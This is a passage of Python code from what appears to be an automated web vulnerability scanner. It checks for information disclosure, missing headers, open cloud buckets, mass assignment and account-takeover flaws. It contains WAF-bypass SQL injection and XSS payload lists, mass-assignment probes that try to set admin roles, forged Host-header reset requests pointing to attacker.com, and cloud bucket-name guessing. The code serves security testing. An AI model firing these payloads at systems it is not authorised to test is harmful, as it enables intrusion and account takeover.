        for pattern, label in STACK_PATTERNS:
            if re.search(pattern, body, re.I):
                vuln(f"Stack trace / error disclosure: {label}", "Medium")
                add("info_disclosure", {
                    "severity": "Medium",
                    "title": f"Stack Trace Disclosed — {label}",
                    "description": f"The application returns detailed error information ({label}) in HTTP responses. Attackers gain file paths, line numbers, and technology stack details.",
                    "recommendation": "Disable debug mode in production. Configure custom error pages. Catch exceptions gracefully.",
                    "url": url,
                })
                break   # one finding per page

        # 3. Debug mode
        for pattern, label in DEBUG_PATTERNS:
            if re.search(pattern, body, re.I):
                vuln(f"Debug mode active: {label}", "High")
                add("info_disclosure", {
                    "severity": "High",
                    "title": f"Debug Mode Enabled — {label}",
                    "description": f"Debug mode indicator found: '{label}'. Debug mode exposes full stack traces, environment variables, and application internals to end users.",
                    "recommendation": "Set DEBUG=False / APP_DEBUG=false / display_errors=Off in production configuration.",
                    "url": url,
                })
                break

        # 4. HTML comments with sensitive content
        for pattern, label in COMMENT_PATTERNS:
            match = re.search(pattern, body, re.I)
            if match:
                snippet = match.group(0)[:100]
                warn(f"Sensitive HTML comment: {label}")
                add("info_disclosure", {
                    "severity": "Low",
                    "title": f"Sensitive Data in HTML Comment — {label}",
                    "description": f"An HTML comment contains potentially sensitive information: '{snippet}'",
                    "recommendation": "Remove all sensitive comments from production HTML. Use server-side templating to avoid exposing internal notes.",
                    "url": url,
                })

        # 5. PII patterns
        for pattern, label in PII_PATTERNS:
            if re.search(pattern, body):
                vuln(f"PII pattern detected: {label}", "High")
                add("info_disclosure", {
                    "severity": "High",
                    "title": f"Potential PII in Response — {label}",
                    "description": f"Response body contains a pattern matching {label}. If real, this constitutes a data breach under GDPR and PCI DSS.",
                    "recommendation": "Mask or truncate sensitive data before rendering in responses. Conduct full data flow audit.",
                    "url": url,
                })

        # 6. Server header version disclosure
        server_hdr = r.headers.get("Server","")
        x_powered = r.headers.get("X-Powered-By","")
        for hdr_val, hdr_name in [(server_hdr, "Server"), (x_powered, "X-Powered-By")]:
            if hdr_val and re.search(r'\d+\.\d+', hdr_val):
                info(f"Version in {hdr_name} header: {hdr_val}")
                add("info_disclosure", {
                    "severity": "Low",
                    "title": f"Software Version Disclosed in {hdr_name} Header",
                    "description": f"{hdr_name}: {hdr_val} — Exact version aids attackers in finding known CVEs for this software.",
                    "recommendation": f"Remove or genericize the {hdr_name} header in web server configuration.",
                    "url": url,
                })

    except Exception as e:
        info(f"Info disclosure scan error: {e}")

    good("Information disclosure scan complete")
    _module_done("info_disclosure")


# ═══ MODULE 57 — ZAP-STYLE PASSIVE ANALYSIS ══════════════════════
def zap_passive_scan(url):
    if _module_skip("zap_passive"): info("Skipping ZAP Passive (already done)"); return
    section("MODULE 57 — ZAP-STYLE PASSIVE ANALYSIS","🔬")

    parsed = urlparse(url)
    base = f"{parsed.scheme}://{parsed.netloc}"
    is_https = parsed.scheme == "https"

    try:
        r = rget(url, timeout=TIMEOUT)
        body = r.text
        hdrs = r.headers

        # 1. Mixed content — HTTPS page loading HTTP resources
        if is_https:
            http_resources = re.findall(
                r'(?:src|href|action|data-src)\s*=\s*["\']http://([^"\']+)["\']', body, re.I)
            if http_resources:
                warn(f"Mixed content detected — {len(http_resources)} HTTP resource(s) on HTTPS page")
                add("zap_passive", {
                    "severity": "Medium",
                    "title": f"Mixed Content — HTTP Resources on HTTPS Page ({len(http_resources)} item(s))",
                    "description": f"HTTPS page loads {len(http_resources)} resource(s) over insecure HTTP: {http_resources[0]}... Browsers block mixed content; attackers can intercept HTTP resources.",
                    "recommendation": "Replace all HTTP resource URLs with HTTPS equivalents. Use Content-Security-Policy to enforce HTTPS-only resource loading.",
                    "url": url,
                })

        # 2. Insecure form action (HTTP form on HTTPS page)
        if is_https:
            http_forms = re.findall(r'<form[^>]+action\s*=\s*["\']http://[^"\']+["\']', body, re.I)
            if http_forms:
                vuln(f"Insecure form action: form posts to HTTP from HTTPS page", "High")
                add("zap_passive", {
                    "severity": "High",
                    "title": "Insecure Form Action — Form Posts Over HTTP",
                    "description": "An HTTPS page contains a form with an HTTP action URL. User input (including passwords) is submitted unencrypted.",
                    "recommendation": "Change all form action URLs to use HTTPS.",
                    "url": url,
                })

        # 3. Autocomplete on password fields
        if re.search(r'<input[^>]+type\s*=\s*["\']password["\'][^>]+>', body, re.I):
            # Check if autocomplete=off is NOT set
            pwd_fields = re.findall(r'<input[^>]+type\s*=\s*["\']password["\'][^>]+>', body, re.I)
            for field in pwd_fields:
                if "autocomplete" not in field.lower():
                    warn("Password field missing autocomplete='off'")
                    add("zap_passive", {
                        "severity": "Low",
                        "title": "Password Field Without autocomplete='off'",
                        "description": "Password input field does not set autocomplete='off'. Browsers may cache the password, exposing it on shared/public devices.",
                        "recommendation": "Add autocomplete='off' or autocomplete='new-password' to all password input fields.",
                        "url": url,
                    })
                    break

        # 4. Cache headers on potentially authenticated pages
        cache_ctrl = hdrs.get("Cache-Control","")
        pragma = hdrs.get("Pragma","")
        # URL-based check uses specific path segments; body check uses more specific phrases
        URL_AUTH_PATHS  = ["logout", "dashboard", "my-account", "admin", "profile"]
        BODY_AUTH_SIGNS = ["logout", "sign out", "my account", "my dashboard",
                           "welcome back", "account settings", "you are logged in"]
        page_has_auth = (
            any(ind in url.lower() for ind in URL_AUTH_PATHS) or
            any(ind in body[:3000].lower() for ind in BODY_AUTH_SIGNS)
        )
        if page_has_auth:
            if "no-store" not in cache_ctrl.lower() and "no-cache" not in cache_ctrl.lower():
                warn("Authenticated/sensitive page may be cached by browser/proxy")
                add("zap_passive", {
                    "severity": "Medium",
                    "title": "Sensitive Page May Be Browser-Cached",
                    "description": f"Page at {url} appears to contain user-specific or authenticated content but Cache-Control header does not include no-store/no-cache. Shared browsers may expose session data.",
                    "recommendation": "Set 'Cache-Control: no-store, no-cache, must-revalidate' and 'Pragma: no-cache' on all authenticated/sensitive pages.",
                    "url": url,
                })

        # 5. robots.txt sensitive paths
        try:
            r_robots = rget(base + "/robots.txt", timeout=min(TIMEOUT, 5))
            if r_robots.status_code == 200:
                SENSITIVE_ROBOT_PATHS = [
                    "/admin", "/administrator", "/backup", "/config", "/database",
                    "/db", "/private", "/secret", "/logs", "/staging", "/dev",
                    "/api", "/internal", "/uploads", "/files",
                ]
                disallowed = re.findall(r'(?:Disallow|Allow):\s*(/[^\s]+)', r_robots.text, re.I)
                sensitive_exposed = [p for p in disallowed
                                     if any(s in p.lower() for s in SENSITIVE_ROBOT_PATHS)]
                if sensitive_exposed:
                    warn(f"robots.txt reveals sensitive paths: {sensitive_exposed[:5]}")
                    add("zap_passive", {
                        "severity": "Low",
                        "title": f"robots.txt Reveals Sensitive Paths ({len(sensitive_exposed)} path(s))",
                        "description": f"robots.txt contains entries for potentially sensitive paths: {', '.join(sensitive_exposed[:5])}. While robots.txt aims to hide these from search engines, it simultaneously advertises them to attackers.",
                        "recommendation": "Remove sensitive paths from robots.txt. Use authentication to protect sensitive paths rather than relying on robots.txt exclusion.",
                        "url": base + "/robots.txt",
                    })
        except Exception: pass

        # 6. Referrer-Policy header
        if "Referrer-Policy" not in hdrs and "referrer-policy" not in {k.lower() for k in hdrs}:
            info("Referrer-Policy header missing")
            add("zap_passive", {
                "severity": "Low",
                "title": "Referrer-Policy Header Missing",
                "description": "Without a Referrer-Policy header, browsers may send full URL (including sensitive query parameters) as Referer to third-party sites linked from this page.",
                "recommendation": "Add: 'Referrer-Policy: strict-origin-when-cross-origin'",
                "url": url,
            })

        # 7. Permissions-Policy header (formerly Feature-Policy)
        if "Permissions-Policy" not in hdrs and "permissions-policy" not in {k.lower() for k in hdrs}:
            info("Permissions-Policy header missing")
            add("zap_passive", {
                "severity": "Low",
                "title": "Permissions-Policy Header Missing",
                "description": "Without Permissions-Policy, any embedded third-party script can access camera, microphone, geolocation, and other browser APIs.",
                "recommendation": "Add: 'Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=()'",
                "url": url,
            })

        # 8. Verbose response size anomaly (potential data dump)
        content_len = len(body)
        if content_len > 500_000:   # > 500KB response
            warn(f"Unusually large response: {content_len // 1024}KB — possible data dump")
            add("zap_passive", {
                "severity": "Low",
                "title": f"Unusually Large HTTP Response ({content_len // 1024} KB)",
                "description": f"The server returned a {content_len // 1024}KB response which may indicate excessive data exposure, debug output, or a data dump.",
                "recommendation": "Review this endpoint for unintended data disclosure. Paginate large datasets. Restrict debug output in production.",
                "url": url,
            })

    except Exception as e:
        info(f"ZAP passive scan error: {e}")

    good("ZAP-style passive analysis complete")
    _module_done("zap_passive")



# ═══════════════════════════════════════════════════════════════════════
#  v11.5 — ENHANCED GLOBAL STRUCTURES
# ═══════════════════════════════════════════════════════════════════════

# CVE database: technology → known CVEs
CVE_DB = {
    "Apache": [
        {"id":"CVE-2021-41773","cvss":9.8,"desc":"Path traversal and RCE in Apache 2.4.49"},
        {"id":"CVE-2021-42013","cvss":9.8,"desc":"Path traversal RCE Apache 2.4.49-2.4.50"},
        {"id":"CVE-2017-7679", "cvss":9.8,"desc":"mod_mime buffer overread"},
        {"id":"CVE-2022-22720","cvss":9.8,"desc":"HTTP request smuggling"},
        {"id":"CVE-2021-26691","cvss":9.8,"desc":"mod_session heap overflow"},
    ],
    "nginx": [
        {"id":"CVE-2021-23017","cvss":9.4,"desc":"Off-by-one in DNS resolver (1-byte heap write)"},
        {"id":"CVE-2019-9511", "cvss":7.5,"desc":"HTTP/2 Data Dribble DoS"},
        {"id":"CVE-2017-7529", "cvss":7.5,"desc":"Integer overflow in range filter"},
        {"id":"CVE-2013-2028", "cvss":7.5,"desc":"Stack-based buffer overflow in chunked transfer"},
    ],
    "PHP": [
        {"id":"CVE-2022-31628","cvss":9.8,"desc":"Uncontrolled resource consumption"},
        {"id":"CVE-2021-21705","cvss":5.3,"desc":"Insufficient FILTER_VALIDATE_URL check"},
        {"id":"CVE-2019-11043","cvss":9.8,"desc":"PHP-FPM env_path buffer underflow → RCE"},
        {"id":"CVE-2018-7314", "cvss":9.8,"desc":"imap_open command injection"},
    ],
    "WordPress": [
        {"id":"CVE-2022-21664","cvss":8.8,"desc":"SQL injection in WP_Query"},
        {"id":"CVE-2022-21663","cvss":8.8,"desc":"Object injection via metadata"},
        {"id":"CVE-2021-39200","cvss":5.3,"desc":"REST API information disclosure"},
        {"id":"CVE-2021-39201","cvss":6.4,"desc":"Admin email disclosure"},
    ],
    "Drupal": [
        {"id":"CVE-2018-7600","cvss":9.8,"desc":"Drupalgeddon2 — Remote Code Execution"},
        {"id":"CVE-2018-7602","cvss":9.8,"desc":"Drupalgeddon2 follow-up RCE"},
        {"id":"CVE-2019-6340","cvss":9.8,"desc":"Remote code execution via REST API"},
    ],
    "Joomla": [
        {"id":"CVE-2023-23752","cvss":5.3,"desc":"Improper access check on REST API"},
        {"id":"CVE-2021-26034","cvss":7.5,"desc":"Inadequate access check in core"},
        {"id":"CVE-2015-8562", "cvss":9.8,"desc":"Remote code execution via session data"},
    ],
    "OpenSSL": [
        {"id":"CVE-2022-0778","cvss":7.5,"desc":"Infinite loop in BN_mod_sqrt — DoS"},
        {"id":"CVE-2021-3711","cvss":9.8,"desc":"SM2 decryption buffer overflow"},
        {"id":"CVE-2014-0160","cvss":7.5,"desc":"Heartbleed — TLS heartbeat memory leak"},
    ],
    "IIS": [
        {"id":"CVE-2022-21907","cvss":9.8,"desc":"HTTP Protocol Stack remote code execution"},
        {"id":"CVE-2021-31166","cvss":9.8,"desc":"HTTP Protocol Stack DoS"},
        {"id":"CVE-2017-7269", "cvss":9.8,"desc":"WebDAV ScStoragePathFromUrl buffer overflow"},
    ],
    "Tomcat": [
        {"id":"CVE-2020-1938","cvss":9.8,"desc":"Ghostcat — AJP file read/RCE"},
        {"id":"CVE-2019-0232","cvss":9.8,"desc":"Remote code execution on Windows CGI"},
        {"id":"CVE-2017-12615","cvss":8.1,"desc":"PUT method file upload"},
    ],
    "Django": [
        {"id":"CVE-2022-28347","cvss":9.8,"desc":"SQL injection in QuerySet.annotate"},
        {"id":"CVE-2021-35042","cvss":9.8,"desc":"SQL injection in QuerySet.order_by"},
    ],
    "Laravel": [
        {"id":"CVE-2021-3129","cvss":9.8,"desc":"Remote code execution via Ignition debug mode"},
    ],
    "Spring": [
        {"id":"CVE-2022-22965","cvss":9.8,"desc":"Spring4Shell — RCE via data binding"},
        {"id":"CVE-2022-22963","cvss":9.8,"desc":"Spring Cloud Function RCE via SpEL"},
        {"id":"CVE-2021-22053","cvss":9.8,"desc":"Spring Framework RCE"},
    ],
    "Redis": [
        {"id":"CVE-2022-0543","cvss":10.0,"desc":"Lua sandbox escape → RCE"},
        {"id":"CVE-2021-32761","cvss":8.8,"desc":"Integer overflow via BITFIELD"},
    ],
    "Elasticsearch": [
        {"id":"CVE-2021-22144","cvss":6.5,"desc":"Uncontrolled resource consumption"},
        {"id":"CVE-2015-1427","cvss":10.0,"desc":"Groovy sandbox escape → RCE"},
    ],
    "Struts": [
        {"id":"CVE-2017-5638","cvss":10.0,"desc":"Equifax breach — RCE via Content-Type"},
        {"id":"CVE-2018-11776","cvss":9.8,"desc":"Remote code execution without namespace"},
    ],
}

# WAF Bypass payload variants
WAF_BYPASS_SQLI = [
    "' /*!OR*/ '1'='1'--",
    "'/**/OR/**/1=1--",
    "' OR 1=1-- -",
    "1' /*!UNION*/ /*!SELECT*/ NULL,NULL--",
    "1' uNiOn SeLeCt NULL,NULL--",
    "' OR 'x'='x",
    "';%09SELECT%09NULL--",
    "' OR 1=1#",
    "1' AND SLEEP(3)--",
    "1'; WAITFOR DELAY '0:0:3'--",
    "1' AND (SELECT * FROM (SELECT(SLEEP(3)))A)--",
    "' OR SLEEP(3)#",
    "' OR pg_sleep(3)--",
    "1; SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE pg_sleep(0) END--",
    "1 AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects WHERE xtype='U'))--",
]

WAF_BYPASS_XSS = [
    "<ScRiPt>alert(1)</ScRiPt>",
    "<img/src='x'onerror=alert(1)>",
    "<svg/onload=&#97;lert(1)>",
    "<%2fscript><script>alert(1)</script>",
    '<img src=x onerror="&#97;lert(1)">',
    "<<script>alert(1)//<</script>",
    "<script>\u0061lert(1)</script>",
    "';alert(String.fromCharCode(88,83,83))//",
    "<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>",
    "<a href=javascript:alert(1)>click</a>",
]

# ═══════════════════════════════════════════════════════════════════════
#  MODULE 58 — WEB CRAWLER / SPIDER
# ═══════════════════════════════════════════════════════════════════════
# Global crawled URLs — shared with other modules
CRAWLED_URLS   = set()
CRAWLED_FORMS  = []  # list of dicts {url, method, params}
CRAWLED_PARAMS = {}  # url → list of params found

def web_crawler_scan(url):
    """Spider the target site to discover endpoints, forms, and parameters."""
    if _module_skip("crawler"): info("Skipping Crawler (already done)"); return
    section("MODULE 58 — WEB CRAWLER / SPIDER","🕷️")

    parsed = urlparse(url)
    base   = f"{parsed.scheme}://{parsed.netloc}"
    domain = parsed.netloc

    visited = set()
    to_visit = {url}
    max_pages = 60  # limit for performance
    forms_found = []

    try:
        from html.parser import HTMLParser

        class _LinkParser(HTMLParser):
            def __init__(self):
                super().__init__()
                self.links  = []
                self.forms  = []
                self._form  = None

            def handle_starttag(self, tag, attrs):
                a = dict(attrs)
                if tag == "a" and a.get("href"):
                    self.links.append(a["href"])
                elif tag == "form":
                    self._form = {"method": a.get("method","get").upper(),
                                  "action": a.get("action",""), "inputs": []}
                elif tag in ("input","textarea","select") and self._form is not None:
                    name = a.get("name")
                    if name:
                        self._form["inputs"].append({"name": name,
                                                      "type": a.get("type","text"),
                                                      "value": a.get("value","")})

            def handle_endtag(self, tag):
                if tag == "form" and self._form is not None:
                    self.forms.append(self._form)
                    self._form = None

        while to_visit and len(visited) < max_pages:
            current = to_visit.pop()
            if current in visited: continue
            visited.add(current)

            try:
                r = rget(current, timeout=TIMEOUT, allow_redirects=True)
                if "text/html" not in r.headers.get("Content-Type",""):
                    continue

                parser = _LinkParser()
                parser.feed(r.text)

                # Process links
                for href in parser.links:
                    abs_url = urljoin(current, href)
                    p = urlparse(abs_url)
                    if p.netloc == domain and abs_url not in visited:
                        # Only follow same-domain links
                        to_visit.add(abs_url.split("#")[0])  # strip fragment

                # Process forms
                for form in parser.forms:
                    action = urljoin(current, form["action"]) if form["action"] else current
                    p = urlparse(action)
                    if p.netloc == domain or not form["action"]:
                        forms_found.append({
                            "url": action,
                            "method": form["method"],
                            "params": [i["name"] for i in form["inputs"]],
                        })

                # Extract query params
                qparams = parse_qs(urlparse(current).query)
                if qparams:
                    CRAWLED_PARAMS[current] = list(qparams.keys())

            except Exception:
                pass

        # Store globally for other modules
        CRAWLED_URLS.update(visited)
        CRAWLED_FORMS.extend(forms_found)

        info(f"Crawler: {len(visited)} pages visited")
        info(f"Crawler: {len(forms_found)} forms found")
        info(f"Crawler: {len(CRAWLED_PARAMS)} URLs with parameters")

        if forms_found:
            add("param_discover", {
                "severity": "Info",
                "confirmed": True,
                "title": f"Web Crawler: {len(visited)} Pages Discovered, {len(forms_found)} Forms",
                "description": f"Crawler mapped {len(visited)} unique URLs and found {len(forms_found)} HTML forms with {sum(len(f['params']) for f in forms_found)} total input fields.",
                "recommendation": "Review all discovered forms for injection vulnerabilities. Remove unused endpoints.",
                "url": url,
                "evidence": f"Endpoints: {len(visited)} | Forms: {len(forms_found)}",
            })

        # Report interesting URLs found
        interesting_paths = [u for u in visited if any(x in u.lower() for x in
                             ["/admin","/api/","/backup","/upload","/debug","/config","/login",
                              "/password","/reset","/register","/signup","/dashboard","/graphql",
                              "/swagger","/actuator","/phpinfo","/env","/health"])]
        if interesting_paths:
            warn(f"Crawler found {len(interesting_paths)} interesting endpoints")
            add("param_discover", {
                "severity": "Medium",
                "confirmed": True,
                "title": f"Crawler: {len(interesting_paths)} Sensitive Endpoints Discovered",
                "description": f"Spider found potentially sensitive paths: {', '.join(interesting_paths[:10])}",
                "recommendation": "Audit each discovered sensitive endpoint for authentication and authorization controls.",
                "url": url,
                "evidence": " | ".join(interesting_paths[:5]),
            })

    except Exception as e:
        info(f"Crawler error: {e}")

    good("Web crawler complete")
    _module_done("crawler")


# ═══════════════════════════════════════════════════════════════════════
#  MODULE 59 — CLOUD STORAGE EXPOSURE (S3 / GCS / Azure)
# ═══════════════════════════════════════════════════════════════════════
def cloud_bucket_scan(url):
    if _module_skip("cloud_bucket"): return
    section("MODULE 59 — CLOUD STORAGE EXPOSURE","☁️")

    parsed  = urlparse(url)
    domain  = parsed.hostname or ""
    # Strip TLD/subdomains to get company name variants
    parts   = domain.split(".")
    company = parts[-2] if len(parts) >= 2 else parts[0]
    # Sanitize company name
    company = re.sub(r"[^a-z0-9-]", "", company.lower())

    # Bucket name variants to try
    variants = [
        company, f"{company}-backup", f"{company}-data", f"{company}-files",
        f"{company}-assets", f"{company}-media", f"{company}-uploads",
        f"{company}-static", f"{company}-images", f"{company}-logs",
        f"{company}-dev", f"{company}-staging", f"{company}-prod",
        f"{company}-public", f"{company}-private", f"{company}-storage",
        f"backup-{company}", f"static-{company}", f"assets-{company}",
        f"{company}backup", f"{company}files", f"{company}data",
    ]

    # S3 bucket URL patterns
    s3_patterns = [
        "https://{}.s3.amazonaws.com/",
        "https://s3.amazonaws.com/{}/",
        "https://{}.s3.us-east-1.amazonaws.com/",
        "https://{}.s3.eu-west-1.amazonaws.com/",
    ]
    # GCS patterns
    gcs_patterns = [
        "https://storage.googleapis.com/{}/",
        "https://{}.storage.googleapis.com/",
    ]
    # Azure patterns
    azure_patterns = [
        "https://{}.blob.core.windows.net/",
        "https://{}.blob.core.windows.net/$web/",
    ]

    # Also check if the target site references cloud buckets in its HTML
    try:
        r = rget(url, timeout=TIMEOUT)
        body = r.text
        # Find any S3/GCS/Azure bucket references
        s3_refs = re.findall(r'(https?://[a-z0-9.-]+\.s3(?:\.[a-z0-9-]+)?\.amazonaws\.com[/\w.-]*)', body, re.I)
        gcs_refs = re.findall(r'(https?://(?:storage\.googleapis\.com/[a-z0-9._-]+|[a-z0-9._-]+\.storage\.googleapis\.com)[/\w.-]*)', body, re.I)
        az_refs  = re.findall(r'(https?://[a-z0-9]+\.blob\.core\.windows\.net[/\w.-]*)', body, re.I)

        all_refs = list(set(s3_refs + gcs_refs + az_refs))
        if all_refs:
            warn(f"Found {len(all_refs)} cloud storage references in page source")
            for ref_url in all_refs[:5]:
                try:
                    r2 = rget(ref_url, timeout=5)
                    if r2.status_code == 200:
                        vuln(f"Publicly accessible cloud storage: {ref_url}", "High")
                        add("cloud_bucket", {
                            "severity": "High",
                            "confirmed": True,
                            "title": f"Publicly Accessible Cloud Storage Bucket",
                            "description": f"Cloud storage bucket is publicly readable: {ref_url}. Data in this bucket is accessible without authentication.",
                            "recommendation": "Set bucket ACL to private. Use IAM policies. Enable server-side access logging.",
                            "url": ref_url,
                            "evidence": f"HTTP {r2.status_code} returned {len(r2.text)} bytes from {ref_url}",
                        })
                    elif r2.status_code == 403:
                        info(f"Cloud bucket exists but access denied: {ref_url}")
                        add("cloud_bucket", {
                            "severity": "Low",
                            "confirmed": True,
                            "title": f"Cloud Storage Bucket Detected (Access Denied)",
                            "description": f"Cloud bucket exists at {ref_url} but returns 403. Bucket enumeration is possible. Data may be exposed through bucket listing if misconfigured.",
                            "recommendation": "Review bucket permissions. Ensure no sensitive bucket names are guessable. Enable access logging.",
                            "url": ref_url,
                            "evidence": f"HTTP 403 from {ref_url} — bucket exists",
                        })
                except Exception: pass
    except Exception: pass

    # Enumerate guessed bucket names
    found_count = 0
    all_patterns = s3_patterns + gcs_patterns + azure_patterns
    for variant in variants[:8]:  # limit to avoid too many requests
        for pattern in all_patterns[:4]:  # check primary patterns
            bucket_url = pattern.format(variant)
            try:
                r = rget(bucket_url, timeout=4, allow_redirects=True)
                if r.status_code == 200:
                    found_count += 1
                    vuln(f"Open cloud bucket: {bucket_url}", "Critical")
                    add("cloud_bucket", {
                        "severity": "Critical",
                        "confirmed": True,
                        "title": f"Open Cloud Storage Bucket: {variant}",
                        "description": f"Cloud storage bucket '{variant}' is publicly readable. All data inside is accessible without credentials.",
                        "recommendation": "Immediately set bucket policy to private. Audit contents for sensitive data. Enable CloudTrail/audit logging.",
                        "url": bucket_url,
                        "evidence": f"HTTP 200 from {bucket_url} ({len(r.text)} bytes)",
                    })
                elif r.status_code == 403:
                    # Bucket exists but private — still worth noting
                    info(f"Bucket exists (private): {bucket_url}")
                    add("cloud_bucket", {
                        "severity": "Info",
                        "confirmed": True,
                        "title": f"Cloud Bucket Exists (Private): {variant}",
                        "description": f"Bucket '{variant}' exists but is not publicly readable. Verify there are no policy misconfigurations.",
                        "recommendation": "Regularly audit bucket policies. Enable object-level access logging.",
                        "url": bucket_url,
                        "evidence": f"HTTP 403 — bucket exists at {bucket_url}",
                    })
            except Exception: pass

    if found_count == 0:
        good("No open cloud storage buckets found")
    _module_done("cloud_bucket")


# ═══════════════════════════════════════════════════════════════════════
#  MODULE 60 — MASS ASSIGNMENT
# ═══════════════════════════════════════════════════════════════════════
def mass_assignment_scan(url):
    if _module_skip("mass_assignment"): return
    section("MODULE 60 — MASS ASSIGNMENT","📦")

    parsed = urlparse(url)
    base   = f"{parsed.scheme}://{parsed.netloc}"

    # API endpoints that commonly accept JSON bodies
    API_ENDPOINTS = [
        "/api/users", "/api/user", "/api/account", "/api/profile",
        "/api/register", "/api/signup", "/api/update",
        "/users", "/user/update", "/account/update",
        "/api/v1/users", "/api/v2/users",
    ]

    # Privileged fields to inject
    PRIV_FIELDS = [
        ("isAdmin",    True),
        ("is_admin",   True),
        ("admin",      True),
        ("role",       "admin"),
        ("roles",      ["admin"]),
        ("permission", "admin"),
        ("privileged", True),
        ("superuser",  True),
        ("is_staff",   True),
        ("verified",   True),
        ("status",     "active"),
        ("balance",    999999),
        ("credits",    999999),
    ]

    for ep in API_ENDPOINTS:
        ep_url = base + ep
        try:
            # First, probe if endpoint exists
            probe = rget(ep_url, allow_redirects=False, timeout=TIMEOUT)
            if probe.status_code not in (200, 201, 400, 401, 403, 405, 422):
                continue

            # Try POST with privileged fields
            for field_name, field_val in PRIV_FIELDS[:5]:
                try:
                    payload = {"username": "test", "email": "test@example.com",
                               "password": "Test@123!", field_name: field_val}
                    r = rpost(ep_url, json=payload, timeout=TIMEOUT)
                    if r.status_code in (200, 201):
                        try:
                            resp = r.json()
                            # Check if the privileged field was reflected back (accepted)
                            if isinstance(resp, dict):
                                if field_name in str(resp).lower() or str(field_val).lower() in str(resp).lower():
                                    vuln(f"Mass assignment: field '{field_name}' accepted at {ep}", "High")
                                    add("mass_assignment", {
                                        "severity": "High",
                                        "confirmed": True,
                                        "title": f"Mass Assignment — Privileged Field '{field_name}' Accepted",
                                        "description": f"POST to {ep_url} with field '{field_name}={field_val}' returned 200/201 and reflected the privileged field. Attackers may be able to elevate privileges.",
                                        "recommendation": "Use allowlists (never denylists) to whitelist only expected fields. Use separate DTOs for user input.",
                                        "url": ep_url,
                                        "evidence": f"POST {{{field_name}: {field_val}}} → 200 | Response contains field: {str(resp)[:200]}",
                                    })
                        except Exception: pass
                    elif r.status_code == 200 and field_name in r.text:
                        add("mass_assignment", {
                            "severity": "Medium",
                            "confirmed": False,
                            "title": f"Potential Mass Assignment — Field '{field_name}' Reflected",
                            "description": f"POST to {ep_url} with '{field_name}' field — the field name appears in the response. Manual verification needed.",
                            "recommendation": "Use allowlists for accepted fields. Never bind user input directly to model objects.",
                            "url": ep_url,
                            "evidence": f"Field '{field_name}' found in response body",
                        })
                except Exception: pass
        except Exception: pass

    good("Mass assignment scan complete")
    _module_done("mass_assignment")


# ═══════════════════════════════════════════════════════════════════════
#  MODULE 61 — ACCOUNT TAKEOVER VECTORS
# ═══════════════════════════════════════════════════════════════════════
def account_takeover_scan(url):
    if _module_skip("acct_takeover"): return
    section("MODULE 61 — ACCOUNT TAKEOVER VECTORS","🔐")

    parsed = urlparse(url)
    base   = f"{parsed.scheme}://{parsed.netloc}"

    # 1. Password reset endpoint detection
    reset_endpoints = [
        "/forgot-password", "/forgot_password", "/reset-password", "/reset_password",
        "/password/reset", "/password/forgot", "/account/recover",
        "/api/forgot-password", "/api/reset-password", "/auth/reset",
        "/users/password/new", "/account/password/reset",
    ]

    for ep in reset_endpoints:
        try:
            r = rget(base + ep, allow_redirects=True, timeout=TIMEOUT)
            if r.status_code == 200 and len(r.text) > 200:
                body = r.text.lower()
                if any(x in body for x in ["email","forgot","reset","recover","password"]):
                    info(f"Password reset endpoint: {ep}")

                    # Test: host header injection in reset link
                    try:
                        r2 = rpost(base + ep,
                                   data={"email": "attacker@evil.com"},
                                   headers={"Host": "attacker.com", "User-Agent": UA},
                                   timeout=TIMEOUT, allow_redirects=False)
                        if r2.status_code in (200, 302):
                            add("acct_takeover", {
                                "severity": "High",
                                "confirmed": False,
                                "title": f"Password Reset — Host Header Injection Possible",
                                "description": f"Reset endpoint at {base+ep} accepted a POST with forged Host header. If the reset link uses the Host header, attackers can send victims reset links pointing to attacker.com.",
                                "recommendation": "Generate reset links using a configured application URL, never the Host header.",
                                "url": base+ep,
                                "evidence": f"POST to {ep} with Host: attacker.com → {r2.status_code}",
                            })
                    except Exception: pass

                    # Test: email parameter pollution
                    try:
                        r3 = rpost(base + ep,
                                   data={"email": "victim@example.com,attacker@evil.com"},
                                   timeout=TIMEOUT)
                        if r3.status_code == 200:
                            add("acct_takeover", {
                                "severity": "Medium",
                                "confirmed": False,
                                "title": f"Password Reset — Email Parameter Pollution",
                                "description": f"Reset endpoint accepted comma-separated email addresses. If the backend sends to all addresses, attackers who include their email can capture reset tokens.",
                                "recommendation": "Validate that email is a single valid address. Reject comma-separated values.",
                                "url": base+ep,
                                "evidence": f"POST email=victim@example.com,attacker@evil.com → {r3.status_code}",
                            })
                    except Exception: pass

                    # Test: weak reset token (predictable numeric token)
                    # Look for token format in URL/response
                    if "token=" in r.url or "token" in body:
                        add("acct_takeover", {
                            "severity": "Medium",
                            "confirmed": False,
                            "title": f"Password Reset Token Visible in Response",
                            "description": f"The reset endpoint at {base+ep} includes or references a 'token' field. Verify token is cryptographically random (256-bit entropy).",
                            "recommendation": "Use cryptographically secure random tokens (secrets.token_urlsafe(32)). Set short expiry (15 min). Use one-time tokens.",
                            "url": base+ep,
                            "evidence": f"'token' found in reset endpoint body/URL",
                        })
        except Exception: pass

    # 2. Username enumeration on login/reset
    login_ep = None
    for ep in ["/login", "/signin", "/api/login", "/api/auth/login", "/auth"]:
        try:
            r = rget(base + ep, allow_redirects=True, timeout=TIMEOUT)
            if r.status_code == 200:
                login_ep = base + ep
                break
        except Exception: pass

    if login_ep:
        try:
            # Test with known bad user vs known bad password for existing user
            r_nonexist = rpost(login_ep, data={"username": "nonexistentuser123xqz", "password": "wrongpass"}, timeout=TIMEOUT)
            r_mayexist  = rpost(login_ep, data={"username": "admin", "password": "wrongpass"}, timeout=TIMEOUT)

            body1 = r_nonexist.text.lower()
            body2 = r_mayexist.text.lower()

            # Different error messages = username enumeration
            # e.g., "user not found" vs "invalid password"
            user_not_found = any(x in body1 for x in ["user not found","no account","doesn't exist","invalid username"])
            wrong_password = any(x in body2 for x in ["invalid password","wrong password","incorrect password"])

            if user_not_found or wrong_password:
                add("acct_takeover", {
                    "severity": "Medium",
                    "confirmed": True,
                    "title": "Username Enumeration via Login Error Messages",
                    "description": "Login endpoint returns different error messages for non-existent users vs wrong passwords, allowing attackers to enumerate valid usernames.",
                    "recommendation": "Return generic error: 'Invalid username or password' for all failed logins. Use timing-safe comparison.",
                    "url": login_ep,
